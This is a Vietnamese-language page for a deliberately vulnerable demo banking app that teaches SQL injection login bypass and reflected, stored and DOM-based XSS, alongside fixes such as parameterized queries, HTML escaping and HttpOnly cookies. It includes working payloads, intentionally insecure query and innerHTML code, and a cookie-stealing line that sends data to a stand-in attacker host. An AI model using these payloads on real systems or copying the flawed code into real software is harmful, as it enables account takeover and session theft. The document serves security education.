🏦 Ngân Hàng Dễ Bị Tấn Công - Bản Trình Diễn Bảo Mật

Bản trình diễn giáo dục về các lỗ hổng SQL Injection và XSS

⚠️ CẢNH BÁO: Ứng dụng này chứa các lỗ hổng bảo mật cố ý chỉ dành cho mục đích giáo dục.

Phần A: SQL Injection - Bỏ Qua Đăng Nhập

Mục Tiêu: Sử dụng SQL Injection để bỏ qua đăng nhập mà không cần biết mật khẩu.

🎯 Phương Pháp Tấn Công

Mã lỗ hổng sử dụng nối chuỗi để tạo các truy vấn SQL:

const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

Bằng cách chèn mã SQL vào trường username, chúng ta có thể thao tác logic truy vấn.

Thử Tấn Công:

💡 Gợi Ý: Thử nhập: ' OR '1'='1

📚 Nó Hoạt Động Như Thế Nào

Khi bạn nhập ' OR '1'='1 làm tên người dùng:

// Truy vấn ban đầu: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything' // Điều này luôn ĐÚNG vì '1'='1' luôn đúng! // Truy vấn trả về người dùng đầu tiên trong cơ sở dữ liệu (thường là admin)

Phần B1: Reflected XSS - Phản Ánh Đầu Vào Ngay Lập Tức

Mục Tiêu: Sử dụng Reflected XSS để inject JavaScript được phản ánh lại ngay lập tức.

Đặc Điểm: Payload không được lưu trữ, chỉ hiển thị cho người dùng hiện tại.

🎯 Phương Pháp Tấn Công

Mã lỗ hổng phản ánh đầu vào người dùng trực tiếp vào HTML mà không có xử lý:

const notification = ` <div class="notification"> <p>Tin nhắn từ ${recipient}:</p> <div class="message-content">${message}</div> </div> `;

Bằng cách chèn các thẻ HTML/JavaScript, chúng ta có thể thực thi mã tùy ý.

Bước 1: Trước tiên, hãy đặt cookie phiên

Bước 2: Thực Thi Payload XSS

Nhập payload XSS để đánh cắp cookie phiên:

💡 Gợi Ý: Thử payload này:
<img src=x onerror="alert('Cookie: ' + document.cookie)">

📚 Nó Hoạt Động Như Thế Nào

Khi bạn chèn:

<img src=x onerror="alert('Cookie: ' + document.cookie)">

Trình duyệt hiển thị thẻ HTML này, và khi hình ảnh không tải được (src=x), hàm onerror thực thi JavaScript để truy cập `document.cookie`.

Kẻ tấn công có thể gửi cookie đến máy chủ của họ bằng:

<img src=x onerror="fetch('http://attacker.com/steal?c=' + document.cookie)">

Phần B2: Stored XSS - Lưu Payload Vào Database

Mục Tiêu: Lưu payload XSS vào database, sẽ tấn công tất cả người dùng xem dữ liệu.

Đặc Điểm: Nguy Hiểm Nhất! Payload được lưu vĩnh viễn và tấn công mọi người.

🎯 Phương Pháp Tấn Công

Nhập payload XSS vào form bình luận, nó sẽ được lưu và hiển thị cho tất cả người dùng:

// Endpoint lưu trữ: POST /comments { "author": "attacker", "content": "<img src=x onerror='stealCookies()'>" } // Khi bất kỳ ai xem danh sách comments, payload sẽ thực thi!

Bước 1: Chèn Payload XSS vào Bình Luận

💡 Gợi Ý: Thử: <img src=x onerror="alert('XSS từ Database!')">

Bước 2: Xem Danh Sách Bình Luận (Payload Thực Thi)

📚 Tại Sao Cảnh Báo

✅ Reflected XSS: Chỉ tấn công người nhận link

❌ Stored XSS: Tấn công TẤT CẢ người dùng xem trang

Stored XSS nguy hiểm nhất vì không cần phishing - chỉ cần chờ người dùng khác xem dữ liệu.

Phần B3: DOM-Based XSS - Lỗi JavaScript Phía Client

Mục Tiêu: Tấn công qua JavaScript client-side có lỗ hổng.

Đặc Điểm: Lỗi ở code JavaScript, server không liên quan.

🎯 Phương Pháp Tấn Công

JavaScript sử dụng innerHTML với dữ liệu chưa được xử lý:

// LỖ HỔNG - Client-side JavaScript: var userInput = getQueryParam('data'); document.getElementById('output').innerHTML = userInput; // Attacker gửi URL: http://app.com/?data=<img src=x onerror=stealCookie()>

Nhập Dữ Liệu (JavaScript Sẽ Render Bằng innerHTML)

💡 Gợi Ý: <img src=x onerror="alert('DOM XSS')">
❌ Kết Quả (innerHTML - LỖ HỔNG):
✅ Kết Quả (textContent - AN TOÀN):

📚 Cách Phân Biệt 3 Loại XSS

  • Reflected: URL → Server → Response ngay lập tức (phishing cần)
  • Stored: Form → Database → Response cho tất cả (nguy hiểm!)
  • DOM: Client JavaScript → innerHTML / eval (lỗi code JS)

ℹ️ Cách Sử Dụng Bản Trình Diễn Này

Chạy Phiên Bản Dễ Bị Tấn Công:

npm install npm start # Truy cập http://localhost:3000

Chạy Phiên Bản An Toàn:

npm run start-secure # Truy cập http://localhost:3000

Phần A: SQL Injection

  • Lỗ Hổng: Nối chuỗi trong truy vấn SQL
  • Tấn Công: Nhập ' OR '1'='1' làm tên người dùng
  • Kết Quả: Bỏ qua xác thực và đăng nhập bạn như người dùng đầu tiên
  • Sửa Lỗi: Sử dụng truy vấn được tham số hóa với chỗ dùng (?)

Phần B: Cross-Site Scripting (XSS)

  • Lỗ Hổng: Đầu vào người dùng phản ánh trực tiếp vào HTML
  • Tấn Công: Chèn mã JavaScript thông qua các thẻ HTML như <img onerror>
  • Kết Quả: JavaScript thực thi và có thể đánh cắp cookie hoặc dữ liệu
  • Sửa Lỗi: Thoát HTML tất cả đầu vào người dùng và sử dụng cookie HttpOnly

Phần C: Các Bản Vá Bảo Mật Được Áp Dụng

✅ Truy Vấn Được Tham Số Hóa - Đầu vào người dùng được coi là dữ liệu, không phải mã SQL - Ví Dụ: db.get(query, [username, password], callback) ✅ Vệ Sinh HTML - Các ký tự đặc biệt được chuyển đổi thành thực thể HTML - < trở thành &lt; (không thể được diễn giải dưới dạng thẻ HTML) ✅ Cookie HttpOnly - JavaScript không thể truy cập cookie (ngăn chặn trộm XSS) - Đặt qua: { httpOnly: true, secure: true, sameSite: 'strict' } ✅ Bảo Vệ CSRF - Cờ SameSite ngăn chặn giả mạo yêu cầu qua site
